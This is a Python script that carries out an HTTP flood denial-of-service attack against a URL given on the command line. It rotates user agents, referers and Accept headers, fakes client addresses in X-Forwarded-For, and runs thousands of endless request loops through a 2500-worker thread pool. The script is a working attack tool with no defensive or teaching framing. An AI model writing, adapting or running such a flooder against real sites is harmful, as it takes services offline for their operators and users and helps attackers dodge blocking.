import urllib.request, threading, time, random, sys, re
from concurrent.futures import ThreadPoolExecutor



headers_useragents=[]
headers_referers=[]

def useragent_list():
        global headers_useragents
        try:
                with open("user_agents.txt", 'r') as f:
                    for line in f:
                        user_agent = line.strip()
                        if user_agent:
                                headers_useragents.append(user_agent)
        except IOError as e:
            print(f"Error opening file 'user_agents.txt': {e}")
        return(headers_useragents)

def referer_list():
        global headers_referers
        try:
            with open("referers.txt", 'r') as f:
                for line in f:
                    refer = line.strip()
                    if refer:
                        headers_referers.append(refer)
        except IOError as e:
            print(f"Error opening file 'referers.txt': {e}")
        return(headers_referers)


def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
]

def httpcall(url):
    headers = {
        'User-Agent':               random.choice(headers_useragents),
        'Referer':                  random.choice(headers_referers),
        'Cache-Control':            'max-age=0',
        'Accept':                   random.choice(acceptall),
        'Accept-Charset':           'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Keep-Alive':               '115',
        'Connection':               'keep-alive',
        'pragma':                   'no-cache',
        'X-Forwarded-For':          spoofer(),
        'Upgrade-Insecure-Requests' :'1',
        'Host':             urllib.parse.urlparse(url).netloc
    }
    try:
        request = urllib.request.Request(url, headers=headers)
        response = urllib.request.urlopen(request)
        if response.getcode() == 200:
            return True
    except:
        pass
    return False

def send_requests(url):
    while True:
        httpcall(url)



if len(sys.argv) < 2:
    print("URL argument not provided.")
    sys.exit()
a = sys.argv[1]
url_regex = r"(?P<url>https?://[^\s]+)"
url = re.search(url_regex, a)

if not url:
    print("Invalid URL.")
    sys.exit()

url = str(url[0])

useragent_list()
referer_list()

t1 = threading.Thread(target=send_requests, args=(url,))
t1.start()


# Inicia as threads para enviar requisições e monitorar
with ThreadPoolExecutor(max_workers=2500) as executor:
    for i in range(3500):
        executor.submit(send_requests, url)



